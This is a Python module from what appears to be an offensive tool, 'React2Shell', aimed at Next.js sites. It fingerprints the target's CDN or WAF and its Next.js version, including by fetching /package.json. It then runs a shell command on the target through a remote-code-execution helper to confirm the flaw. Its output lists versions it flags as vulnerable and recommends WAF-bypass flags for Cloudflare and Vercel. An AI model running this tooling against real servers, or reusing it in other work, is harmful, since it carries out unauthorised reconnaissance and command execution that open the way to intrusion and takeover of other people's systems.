"""Target detection and information gathering for React2Shell."""

import re
import time
import requests
from typing import Dict, Any
from ..classes.executor import execute_command
from ..utils.colors import Colors, colorize


def detect_target_info(target_url: str, timeout: int = 10, verify_ssl: bool = True) -> Dict[str, Any]:
    """Detect target information: WAF, proxy, Next.js version, vulnerability status."""
    info = {
        "target": target_url,
        "reachable": False,
        "proxy": None,
        "waf": None,
        "nextjs_version": None,
        "server": None,
        "vulnerable": None,
        "status_code": None,
        "headers": {},
        "response_time": None,
        "errors": []
    }
    
    try:
        start_time = time.time()
        response = requests.get(target_url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
        info["response_time"] = round((time.time() - start_time) * 1000, 2)
        info["reachable"] = True
        info["status_code"] = response.status_code
        info["headers"] = dict(response.headers)
        
        server_header = response.headers.get("Server", "").lower()
        
        # Detect Cloudflare
        cf_ray = response.headers.get("CF-Ray", "")
        cf_country = response.headers.get("CF-IPCountry", "")
        cf_cache = response.headers.get("CF-Cache-Status", "")
        if cf_ray or "cloudflare" in server_header or cf_cache:
            info["proxy"] = "Cloudflare"
            info["waf"] = "Cloudflare WAF"
            if cf_ray:
                info["waf"] += f" (Ray: {cf_ray[:8]}...)"
            if cf_country:
                info["waf"] += f" (Country: {cf_country})"
        
        # Detect Vercel
        vercel_deployment = response.headers.get("X-Vercel-Id", "")
        vercel_cache = response.headers.get("X-Vercel-Cache", "")
        if vercel_deployment or "vercel" in server_header:
            info["proxy"] = "Vercel"
            if vercel_deployment:
                info["waf"] = f"Vercel (Deployment: {vercel_deployment[:8]}...)"
            if vercel_cache:
                info["waf"] += f" (Cache: {vercel_cache})"
        
        # Detect AWS CloudFront
        if "cloudfront" in server_header or "x-amz-cf-id" in response.headers:
            info["proxy"] = "AWS CloudFront"
            info["waf"] = "AWS WAF"
        
        # Detect Fastly
        if "fastly" in server_header or "x-fastly-request-id" in response.headers:
            info["proxy"] = "Fastly"
            info["waf"] = "Fastly WAF"
        
        # Detect Akamai
        if "akamai" in server_header or "x-akamai-request-id" in response.headers:
            info["proxy"] = "Akamai"
            info["waf"] = "Akamai WAF"
        
        # Detect Next.js
        powered_by = response.headers.get("X-Powered-By", "")
        nextjs_detected = False
        
        if "next.js" in powered_by.lower():
            info["server"] = "Next.js"
            nextjs_detected = True
            version_patterns = [
                r'next\.js[/\s]+([0-9]+\.[0-9]+\.[0-9]+)',
                r'next\.js[/\s]+([0-9]+\.[0-9]+)',
                r'next[.\s]+([0-9]+\.[0-9]+\.[0-9]+)',
                r'v([0-9]+\.[0-9]+\.[0-9]+)',
            ]
            for pattern in version_patterns:
                version_match = re.search(pattern, powered_by, re.IGNORECASE)
                if version_match:
                    info["nextjs_version"] = version_match.group(1)
                    break
        
        if "x-nextjs-request-id" in response.headers or "RSC" in response.headers.get("Vary", ""):
            if not info["server"]:
                info["server"] = "Next.js"
                nextjs_detected = True
        
        if not info.get("nextjs_version"):
            response_text = response.text[:5000]
            body_version_patterns = [
                r'next[.\s/]+([0-9]+\.[0-9]+\.[0-9]+)',
                r'__NEXT_DATA__.*?"version":"([0-9]+\.[0-9]+\.[0-9]+)"',
                r'<!-- Next\.js ([0-9]+\.[0-9]+\.[0-9]+) -->',
            ]
            for pattern in body_version_patterns:
                version_match = re.search(pattern, response_text, re.IGNORECASE)
                if version_match:
                    info["nextjs_version"] = version_match.group(1)
                    break
        
        if info.get("server") == "Next.js" and not info.get("nextjs_version"):
            try:
                package_json_url = f"{target_url.rstrip('/')}/package.json"
                package_response = requests.get(package_json_url, timeout=2, verify=verify_ssl, allow_redirects=False)
                if package_response.status_code == 200:
                    try:
                        package_data = package_response.json()
                        next_dep = package_data.get("dependencies", {}).get("next") or package_data.get("devDependencies", {}).get("next")
                        if next_dep:
                            version_match = re.search(r'([0-9]+\.[0-9]+\.[0-9]+)', str(next_dep))
                            if version_match:
                                info["nextjs_version"] = version_match.group(1)
                    except:
                        pass
            except:
                pass
        
        if not info["server"]:
            if "nginx" in server_header:
                info["server"] = "Nginx"
            elif "apache" in server_header:
                info["server"] = "Apache"
            elif "caddy" in server_header:
                info["server"] = "Caddy"
            elif server_header:
                info["server"] = server_header.title()
        
        # Quick vulnerability test
        test_command = "echo $((41*271))"
        test_result = execute_command(target_url, test_command, timeout=5, verify_ssl=verify_ssl, windows=False, base64_encode=False)
        
        if test_result.get("vulnerable") and test_result.get("output") == "11111":
            info["vulnerable"] = True
        elif test_result.get("status_code") == 500:
            info["vulnerable"] = "Likely (command executed)"
        elif test_result.get("status_code") in [400, 403]:
            info["vulnerable"] = False
        else:
            info["vulnerable"] = "Unknown"
        
    except requests.exceptions.SSLError as e:
        info["errors"].append(f"SSL Error: {str(e)}")
    except requests.exceptions.ConnectionError as e:
        info["errors"].append(f"Connection Error: {str(e)}")
    except requests.exceptions.Timeout:
        info["errors"].append(f"Request timed out after {timeout}s")
    except Exception as e:
        info["errors"].append(f"Error: {str(e)}")
    
    return info


def print_startup_info(info: Dict[str, Any], windows: bool = False):
    """Print comprehensive startup information in compact format."""
    print(colorize(f"[*] Target: {info['target']}", Colors.CYAN))
    print(colorize(f"[*] Platform: {'Windows' if windows else 'Unix/Linux'}", Colors.CYAN))
    
    if not info["reachable"]:
        print(colorize("[!] Target is not reachable", Colors.RED))
        if info["errors"]:
            for error in info["errors"]:
                print(f"    {colorize('Error:', Colors.YELLOW)} {error}")
        print()
        return
    
    server_info = []
    if info["server"]:
        if info["server"] == "Next.js":
            if info.get("nextjs_version"):
                version_color = Colors.RED if info["nextjs_version"] in ["16.0.5", "16.0.4", "16.0.3", "16.0.2", "16.0.1", "16.0.0", "15.1.0", "15.0.0"] else Colors.YELLOW
                server_info.append(f"Next.js: {colorize(info['nextjs_version'], version_color)}")
                if info["nextjs_version"] in ["16.0.5", "16.0.4", "16.0.3", "16.0.2", "16.0.1", "16.0.0", "15.1.0", "15.0.0"]:
                    server_info.append(colorize("⚠️ VULNERABLE", Colors.RED + Colors.BOLD))
            else:
                server_info.append(f"Server: {colorize(info['server'], Colors.GREEN)}")
        else:
            server_info.append(f"Server: {colorize(info['server'], Colors.GREEN)}")
            if info["nextjs_version"] and info["nextjs_version"] != "Unknown":
                version_color = Colors.RED if info["nextjs_version"] in ["16.0.5", "16.0.4", "16.0.3", "16.0.2", "16.0.1", "16.0.0", "15.1.0", "15.0.0"] else Colors.YELLOW
                server_info.append(f"Next.js: {colorize(info['nextjs_version'], version_color)}")
                if info["nextjs_version"] in ["16.0.5", "16.0.4", "16.0.3", "16.0.2", "16.0.1", "16.0.0", "15.1.0", "15.0.0"]:
                    server_info.append(colorize("⚠️ VULNERABLE", Colors.RED + Colors.BOLD))
    
    proxy_info = []
    if info["proxy"]:
        proxy_info.append(f"Proxy: {colorize(info['proxy'], Colors.YELLOW)}")
    if info["waf"]:
        waf_display = info["waf"]
        if len(waf_display) > 40:
            waf_display = waf_display[:37] + "..."
        proxy_info.append(f"WAF: {colorize(waf_display, Colors.YELLOW)}")
    
    vuln_status = []
    if info["vulnerable"] is True:
        vuln_status.append(colorize("VULNERABLE ⚠️", Colors.RED + Colors.BOLD))
    elif info["vulnerable"] is False:
        vuln_status.append(colorize("PROTECTED ✓", Colors.GREEN))
    elif info["vulnerable"] == "Likely (command executed)":
        vuln_status.append(colorize("LIKELY VULNERABLE ⚠️", Colors.YELLOW + Colors.BOLD))
    else:
        vuln_status.append(colorize("UNKNOWN ?", Colors.YELLOW))
    
    if server_info:
        print(colorize(f"[*] {' | '.join(server_info)}", Colors.CYAN))
    if proxy_info:
        print(colorize(f"[*] {' | '.join(proxy_info)}", Colors.CYAN))
    if vuln_status:
        print(colorize(f"[*] Status: {vuln_status[0]}", Colors.CYAN))
    
    if info["waf"]:
        if "Cloudflare" in info["waf"]:
            print(colorize("    💡 Tip: Use --waf-bypass for Cloudflare bypass", Colors.CYAN))
        elif "Vercel" in info["waf"]:
            print(colorize("    💡 Tip: Use --vercel-waf-bypass for Vercel bypass", Colors.CYAN))
    
    print()

